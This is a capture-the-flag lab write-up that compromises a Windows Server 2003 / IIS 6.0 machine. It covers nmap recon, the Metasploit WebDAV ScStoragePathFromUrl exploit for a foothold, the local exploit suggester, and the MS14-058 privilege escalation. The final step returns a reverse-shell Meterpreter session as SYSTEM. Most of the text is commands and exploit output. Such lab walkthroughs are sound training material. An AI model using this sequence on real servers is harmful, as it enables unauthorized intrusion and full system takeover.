# recon
- nmap
```
80/tcp open  http    Microsoft IIS httpd 6.0
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /postinfo.html: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.dll: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.exe: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder
|   /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder
|   /_vti_bin/shtml.dll: Frontpage file or folder
|_  /_vti_bin/shtml.exe: Frontpage file or folder
| http-frontpage-login: 
|   VULNERABLE:
|   Frontpage extension anonymous login
|     State: VULNERABLE
|       Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise.
```
- Microsoft Windows 2003|2008|XP|2000 (92%)

- port 80
  - /_vti_bin/_vti_aut/author.exe
  - /_vti_bin/_vti_adm/admin.exe
  - /_vti_bin/shtml.exe
  - _vti_inf.html : FrontPage Configuration Information
```
<!-- FrontPage Configuration Information
    FPVersion="5.0.2.6790"
    FPShtmlScriptUrl="_vti_bin/shtml.dll/_vti_rpc"
    FPAuthorScriptUrl="_vti_bin/_vti_aut/author.dll"
    FPAdminScriptUrl="_vti_bin/_vti_adm/admin.dll"
    TPScriptUrl="_vti_bin/owssvr.dll"
```

after some diging on, FPVersion and FrontPage Configuration.
- https://docs.microsoft.com/en-us/security-updates/securitybulletins/2003/ms03-051
- https://www.rapid7.com/db/modules/exploit/windows/isapi/ms03_051_fp30reg_chunked
to sumup: it use `/_vti_bin/_vti_aut/fp30reg.dll` to exploit the server but sadly there is no `fp30reg.dll`

so back to step one again. let check more info on **Microsoft IIS httpd 6.0** and looking for exploit. after som digging, I decided to use `iis_webdav_scstoragepathfromurl` on msfconsole. 
- https://www.exploit-db.com/exploits/41738
- https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl
```
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > check
[+] 10.10.10.14:80 - The target is vulnerable.
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run
```

# foot hold
```
c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```
lets grab the flags
```
meterpreter > cat Harry/Desktop/user.txt
[-] stdapi_fs_stat: Operation failed: Access is denied.
meterpreter > cd Harry
[-] stdapi_fs_chdir: Operation failed: Access is denied.
```
ofc it doesnt works, we are only an network service user...
```cmd
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
.
.
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q1472
.
```
okey let backgroud the session and run exploit suggerter


```
msf5 post(multi/recon/local_exploit_suggester) > run

[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
  This module will create a new session with SYSTEM privileges via the 
  KiTrap0D exploit by Tavis Ormandy. If the session in use is already 
  elevated then the exploit will not run. The module relies on 
  kitrap0d.x86.dll, and is not supported on x64 editions of Windows.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
  This module exploits a NULL Pointer Dereference in win32k.sys, the 
  vulnerability can be triggered through the use of TrackPopupMenu. 
  Under special conditions, the NULL pointer dereference can be abused 
  on xxxSendMessageTimeout to achieve arbitrary code execution. This 
  module has been tested successfully on Windows XP SP3, Windows 2003 
  SP2, Windows 7 SP1 and Windows 2008 32bits. Also on Windows 7 SP1 
  and Windows 2008 R2 SP1 64 bits.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
  A vulnerability within the Microsoft TCP/IP protocol driver 
  tcpip.sys can allow a local attacker to trigger a NULL pointer 
  dereference by using a specially crafted IOCTL. This flaw can be 
  abused to elevate privileges to SYSTEM.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
  This module exploits improper object handling in the win32k.sys 
  kernel mode driver. This module has been tested on vulnerable builds 
  of Windows 7 x64 and x86, and Windows 2008 R2 SP1 x64.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
  This module exploits the vulnerability in mrxdav.sys described by 
  MS16-016. The module will spawn a process on the target system and 
  elevate its privileges to NT AUTHORITY\SYSTEM before executing the 
  specified payload within the context of the elevated process.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
  This module exploits a vulnerability on EPATHOBJ::pprFlattenRec due 
  to the usage of uninitialized data which allows to corrupt memory. 
  At the moment, the module has been tested successfully on Windows XP 
  SP3, Windows 2003 SP1, and Windows 7 SP1.
```

# root
I decided to use `windows/local/ms14_058_track_popup_menu` since it looks accurate. Base on infomation from suggerter the exploit is tested on `Windows 2003 SP2` which is the save os as the victim server.
```
msf5 exploit(windows/local/ms14_058_track_popup_menu) > run
[*] Started reverse TCP handler on 10.10.14.12:4445 
[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.
[*] Exploit completed, but no session was created.
```
so let move back to our session 1. and migrate to proccess `wmiprvse.exe` now background it and run the exploit again.
```
msf5 exploit(windows/local/ms14_058_track_popup_menu) > run

[*] Started reverse TCP handler on 10.10.14.12:4445 
[*] Launching notepad to host the exploit...
[+] Process 3252 launched.
[*] Reflectively injecting the exploit DLL into 3252...
[*] Injecting exploit into 3252...
[*] Exploit injected. Injecting payload into 3252...
[*] Payload injected. Executing exploit...
[*] Sending stage (176195 bytes) to 10.10.10.14
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 2 opened (10.10.14.12:4445 -> 10.10.10.14:1042) at 2020-09-23 13:59:22 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```
go grab the flags